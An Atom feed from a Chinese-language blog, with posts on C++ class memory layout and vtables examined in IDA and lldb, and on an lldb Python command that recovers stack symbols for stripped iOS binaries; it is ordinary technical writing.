<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-01-22T10:08:39.833Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/22/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/22/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2019-01-22T10:07:00.000Z</published>
    <updated>2019-01-22T10:08:39.833Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"> </div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"> </div><div class="line"><span class="comment">// 基类</span></div><div class="line"><span class="keyword">class</span> Shape </div><div class="line">&#123;</div><div class="line">   <span class="keyword">public</span>:</div><div class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setWidth</span><span class="params">(<span class="keyword">int</span> w)</span></span></div><div class="line">      &#123;</div><div class="line">         width = w;</div><div class="line">      &#125;</div><div class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> h)</span></span></div><div class="line">      &#123;</div><div class="line">         height = h;</div><div class="line">      &#125;</div><div class="line">   <span class="keyword">protected</span>:</div><div class="line">      <span class="keyword">int</span> width;</div><div class="line">      <span class="keyword">int</span> height;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line"><span class="comment">// 派生类</span></div><div class="line"><span class="keyword">class</span> Rectangle: <span class="keyword">public</span> Shape</div><div class="line">&#123;</div><div class="line">   <span class="keyword">public</span>:</div><div class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></div><div class="line">      &#123; </div><div class="line">         <span class="keyword">return</span> (width * height); </div><div class="line">      &#125;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">   Rectangle Rect;</div><div class="line"> </div><div class="line">   Rect.setWidth(<span class="number">5</span>);</div><div class="line">   Rect.setHeight(<span class="number">7</span>);</div><div class="line"> </div><div class="line">   <span class="comment">// 输出对象的面积</span></div><div class="line">   <span class="built_in">cout</span> &lt;&lt; <span class="string">"Total area: "</span> &lt;&lt; Rect.getArea() &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"> </div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>上面的代码编译完成后，在ida中反汇编如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v3; <span class="comment">// ST08_8</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></div><div class="line">  __int64 (__fastcall *v8)(_QWORD); <span class="comment">// [rsp+20h] [rbp-10h]</span></div><div class="line">  __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></div><div class="line"></div><div class="line">  v7 = <span class="number">0</span>;</div><div class="line">  Shape::setWidth((Shape *)&amp;v6, <span class="number">5</span>);</div><div class="line">  Shape::setHeight((Shape *)&amp;v6, <span class="number">7</span>);</div><div class="line">  v3 = <span class="built_in">std</span>::__1::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::__1::<span class="built_in">cout</span>, <span class="string">"Total area: "</span>);</div><div class="line">  v4 = Rectangle::getArea((Rectangle *)&amp;v6);</div><div class="line">  v9 = <span class="built_in">std</span>::__1::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v3, v4);</div><div class="line">  v8 = <span class="built_in">std</span>::__1::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;;</div><div class="line">  <span class="built_in">std</span>::__1::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v9);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Rect内存布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(lldb) x/20b $rbp-0x20</div><div class="line">0x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</div><div class="line">0x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</div></pre></td></tr></table></figure><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST10_8</span></div><div class="line">  __int64 v4; <span class="comment">// ST08_8</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></div><div class="line">  __int64 v6; <span class="comment">// ST38_8</span></div><div class="line"></div><div class="line">  v3 = (<span class="keyword">void</span> *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8u</span>LL);</div><div class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">8u</span>LL);</div><div class="line">  Shape::setWidth((Shape *)v3, <span class="number">5</span>);</div><div class="line">  Shape::setHeight((Shape *)v3, <span class="number">7</span>);</div><div class="line">  v4 = <span class="built_in">std</span>::__1::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::__1::<span class="built_in">cout</span>, <span class="string">"Total area: "</span>);</div><div class="line">  v5 = Rectangle::getArea((Rectangle *)v3);</div><div class="line">  v6 = <span class="built_in">std</span>::__1::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v4, v5);</div><div class="line">  <span class="built_in">std</span>::__1::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v6);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"> </div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"> </div><div class="line"><span class="comment">// 基类</span></div><div class="line"><span class="keyword">class</span> Shape </div><div class="line">&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">   <span class="comment">// 提供接口框架的纯虚函数</span></div><div class="line">   <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span> </span>= <span class="number">0</span>;</div><div class="line">   <span class="function"><span class="keyword">void</span> <span class="title">setWidth</span><span class="params">(<span class="keyword">int</span> w)</span></span></div><div class="line">   &#123;</div><div class="line">      width = w;</div><div class="line">   &#125;</div><div class="line">   <span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> h)</span></span></div><div class="line">   &#123;</div><div class="line">      height = h;</div><div class="line">   &#125;</div><div class="line"><span class="keyword">protected</span>:</div><div class="line">   <span class="keyword">int</span> width;</div><div class="line">   <span class="keyword">int</span> height;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line"><span class="comment">// 派生类</span></div><div class="line"><span class="keyword">class</span> Rectangle: <span class="keyword">public</span> Shape</div><div class="line">&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></div><div class="line">   &#123; </div><div class="line">      <span class="keyword">return</span> (width * height); </div><div class="line">   &#125;</div><div class="line">&#125;;</div><div class="line"><span class="keyword">class</span> Triangle: <span class="keyword">public</span> Shape</div><div class="line">&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">   <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></div><div class="line">   &#123; </div><div class="line">      <span class="keyword">return</span> (width * height)/<span class="number">2</span>; </div><div class="line">   &#125;</div><div class="line">&#125;;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">   Rectangle Rect;</div><div class="line">   Triangle  Tri;</div><div class="line"> </div><div class="line">   Rect.setWidth(<span class="number">5</span>);</div><div class="line">   Rect.setHeight(<span class="number">7</span>);</div><div class="line">   <span class="comment">// 输出对象的面积</span></div><div class="line">   <span class="built_in">cout</span> &lt;&lt; <span class="string">"Total Rectangle area: "</span> &lt;&lt; Rect.getArea() &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"> </div><div class="line">   Tri.setWidth(<span class="number">5</span>);</div><div class="line">   Tri.setHeight(<span class="number">7</span>);</div><div class="line">   <span class="comment">// 输出对象的面积</span></div><div class="line">   <span class="built_in">cout</span> &lt;&lt; <span class="string">"Total Triangle area: "</span> &lt;&lt; Tri.getArea() &lt;&lt; <span class="built_in">endl</span>; </div><div class="line"> </div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>上面的代码编译完成后，在ida中反汇编如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v3; <span class="comment">// ST20_8</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></div><div class="line">  __int64 v5; <span class="comment">// ST10_8</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+28h] [rbp-48h]</span></div><div class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+38h] [rbp-38h]</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+4Ch] [rbp-24h]</span></div><div class="line">  __int64 (__fastcall *v11)(_QWORD); <span class="comment">// [rsp+50h] [rbp-20h]</span></div><div class="line">  __int64 v12; <span class="comment">// [rsp+58h] [rbp-18h]</span></div><div class="line">  __int64 (__fastcall *v13)(_QWORD); <span class="comment">// [rsp+60h] [rbp-10h]</span></div><div class="line">  __int64 v14; <span class="comment">// [rsp+68h] [rbp-8h]</span></div><div class="line"></div><div class="line">  v10 = <span class="number">0</span>;</div><div class="line">  Rectangle::Rectangle((Rectangle *)&amp;v9);</div><div class="line">  Triangle::Triangle((Triangle *)&amp;v8);</div><div class="line">  Shape::setWidth((Shape *)&amp;v9, <span class="number">5</span>);</div><div class="line">  Shape::setHeight((Shape *)&amp;v9, <span class="number">7</span>);</div><div class="line">  v3 = <span class="built_in">std</span>::__1::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::__1::<span class="built_in">cout</span>, <span class="string">"Total Rectangle area: "</span>);</div><div class="line">  v4 = Rectangle::getArea((Rectangle *)&amp;v9);</div><div class="line">  v12 = <span class="built_in">std</span>::__1::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v3, v4);</div><div class="line">  v11 = <span class="built_in">std</span>::__1::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;;</div><div class="line">  <span class="built_in">std</span>::__1::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v12);</div><div class="line">  Shape::setWidth((Shape *)&amp;v8, <span class="number">5</span>);</div><div class="line">  Shape::setHeight((Shape *)&amp;v8, <span class="number">7</span>);</div><div class="line">  v5 = <span class="built_in">std</span>::__1::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::__1::<span class="built_in">cout</span>, <span class="string">"Total Triangle area: "</span>);</div><div class="line">  v6 = Triangle::getArea((Triangle *)&amp;v8);</div><div class="line">  v14 = <span class="built_in">std</span>::__1::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v5, v6);</div><div class="line">  v13 = <span class="built_in">std</span>::__1::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;;</div><div class="line">  <span class="built_in">std</span>::__1::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::__1::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v14);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">__int64 *__fastcall Rectangle::Rectangle(Rectangle *<span class="keyword">this</span>)</div><div class="line">&#123;</div><div class="line">  __int64 *result; <span class="comment">// rax</span></div><div class="line"></div><div class="line">  Shape::Shape(<span class="keyword">this</span>);</div><div class="line">  result = &amp;`vtable <span class="keyword">for</span>'Rectangle + <span class="number">2</span>;</div><div class="line">  *(_QWORD *)<span class="keyword">this</span> = &amp;`vtable <span class="keyword">for</span>'Rectangle + <span class="number">2</span>;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">__int64 *__fastcall Shape::Shape(Shape *<span class="keyword">this</span>)</div><div class="line">&#123;</div><div class="line">  __int64 *result; <span class="comment">// rax</span></div><div class="line"></div><div class="line">  result = &amp;`vtable <span class="keyword">for</span>'Shape + <span class="number">2</span>;</div><div class="line">  *(_QWORD *)<span class="keyword">this</span> = &amp;`vtable <span class="keyword">for</span>'Shape + <span class="number">2</span>;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(lldb) x/20b $rbp-0x38</div><div class="line">0x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x00</div><div class="line">0x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</div></pre></td></tr></table></figure><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">__data:<span class="number">0000000100002110</span> ; `vtable <span class="keyword">for</span>'Rectangle</div><div class="line">__data:<span class="number">0000000100002110</span> __ZTV9Rectangle dq <span class="number">0</span>                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o</div><div class="line">__data:<span class="number">0000000100002110</span>                                         ; offset to <span class="keyword">this</span></div><div class="line">__data:<span class="number">0000000100002118</span>                 dq offset __ZTI9Rectangle ; `typeinfo <span class="keyword">for</span>'Rectangle</div><div class="line">__data:<span class="number">0000000100002120</span>                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(<span class="keyword">void</span>)</div></pre></td></tr></table></figure><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2018-10-03T06:22:32.322Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://git.xiaojukeji.com/zhangshun/xia0LLDB" target="_blank" rel="external">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2018-10-03T05:57:37.910Z</updated>
    
